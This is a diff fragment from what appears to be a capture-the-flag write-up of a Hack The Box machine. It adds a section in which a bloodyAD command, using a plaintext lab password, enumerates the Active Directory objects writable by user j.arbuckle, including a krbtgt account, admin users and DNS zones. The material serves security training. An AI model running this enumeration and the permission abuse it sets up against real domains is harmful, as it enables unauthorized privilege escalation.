@@ -153,3 +153,33 @@ SMB         10.129.86.27    445    DC01             krbtgt_8245                 
 
 Ill also use nxc to pull out the user descriptions for this second krbtgt account
 
+# Writable objects as `j.arbuckle`
+
+```python
+❯❯❯ bloodyAD --host dc01.garfield.htb -d garfield.htb -u 'j.arbuckle' -p 'Th1sD4mnC4t!@1978' get writable
+
+distinguishedName: CN=Guest,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=krbtgt_8245,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Jon Arbuckle,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Liz Wilson,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: CN=Liz Wilson ADM,CN=Users,DC=garfield,DC=htb
+permission: WRITE
+
+distinguishedName: DC=garfield.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=garfield,DC=htb
+permission: CREATE_CHILD
+
+distinguishedName: DC=_msdcs.garfield.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=garfield,DC=htb
+permission: CREATE_CHILD
+```
+
